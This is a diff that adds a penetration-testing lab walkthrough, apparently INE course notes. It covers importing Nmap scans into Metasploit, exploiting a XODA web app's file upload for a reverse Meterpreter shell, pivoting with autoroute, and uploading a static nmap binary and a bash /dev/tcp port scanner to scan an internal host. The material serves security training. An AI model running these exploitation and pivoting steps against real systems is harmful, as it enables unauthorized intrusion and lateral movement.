@@ -333,4 +333,165 @@ In this lab, we used multiple Nmap SMB scripts to:
 - [Microsoft IPC$ Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)
 - [INE Lab Page](https://my.ine.com/CyberSecurity/courses/a415dc11-1c2a-43d5-86ae-1f919d5661cd/assessment-methodologies-footprinting-scanning/lab/5ace3b40-27a1-4322-8891-694e801f4b4d)
 
+# Lab: Importing Nmap Scan Results Into Metasploit & Service Scanning
+
+## Overview
+
+This lab demonstrates the process of:
+1. Importing Nmap scan results into the Metasploit Framework (MSF)
+2. Performing a port scan using different methods
+3. Exploiting a vulnerable XODA web app instance
+4. Routing and scanning a second target machine
+
+---
+
+## Part 1: Importing Nmap Scan Results Into MSF
+
+### Step 1: Access Kali Machine
+Open the lab link to access the Kali Linux environment.
+
+### Step 2: Ping Target Machine
+```bash
+ping -c 4 demo.ine.local
+```
+If not reachable, use the `-Pn` option in Nmap to skip host discovery.
+
+### Step 3: Perform Nmap Scan and Save Output
+```bash
+nmap -sV -Pn -oX myscan.xml demo.ine.local
+```
+
+### Step 4: Start PostgreSQL Service
+```bash
+service postgresql start
+```
+
+### Step 5: Start Metasploit Framework
+```bash
+msfconsole
+```
+
+### Step 6: Check Database Status
+```bash
+db_status
+```
+
+### Step 7: Import Scan Results into MSF
+```bash
+db_import myscan.xml
+```
+
+### Step 8: View Imported Results
+```bash
+hosts
+services
+```
+
+---
+
+## Part 2: T1046 - Network Service Scanning
+
+### Step 1: Access Kali Machine
+
+### Step 2: Ping New Target
+```bash
+ping -c 4 demo1.ine.local
+```
+
+### Step 3: Default Nmap Scan
+```bash
+nmap demo1.ine.local
+```
+
+### Step 4: View HTTP Content
+```bash
+curl demo1.ine.local
+```
+
+### Step 5: Start Metasploit
+```bash
+msfconsole
+```
+
+### Step 6: Exploit XODA File Upload
+```bash
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS demo1.ine.local
+set TARGETURI /
+set LHOST 192.63.4.2
+exploit
+```
+
+### Step 7: Check Network Interfaces
+```bash
+shell
+ip addr
+```
+
+### Step 8: Add Route to MSF
+```bash
+run autoroute -s 192.180.108.2
+```
+
+### Step 9: Port Scan Second Target
+```bash
+CTRL+Z
+y
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.180.108.3
+set verbose false
+set ports 1-1000
+exploit
+```
+
+---
+
+## Part 3: Bash & Static Binary Scanning
+
+### Step 10: Check Nmap Binary
+```bash
+ls -al /root/static-binaries/nmap
+file /root/static-binaries/nmap
+```
+
+### Step 11: Create Bash Port Scanner Script
+```bash
+#!/bin/bash
+for port in {1..1000}; do
+  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done
+```
+Save as: `bash-port-scanner.sh`
+
+### Step 12: Return to Meterpreter
+```bash
+fg
+sessions -i 1
+```
+
+### Step 13: Upload Files
+```bash
+upload /root/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+```
+
+### Step 14: Make Executable and Run Scanner
+```bash
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh 192.180.108.3
+```
+
+### Step 15: Use Nmap Binary to Scan
+```bash
+./nmap -p- 192.180.108.3
+```
+
+---
+
+## References
+
+- MITRE ATT&CK: [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
+- Bash TCP Port Scanner: [https://catonmat.net/tcp-port-scanner-in-bash](https://catonmat.net/tcp-port-scanner-in-bash)
 
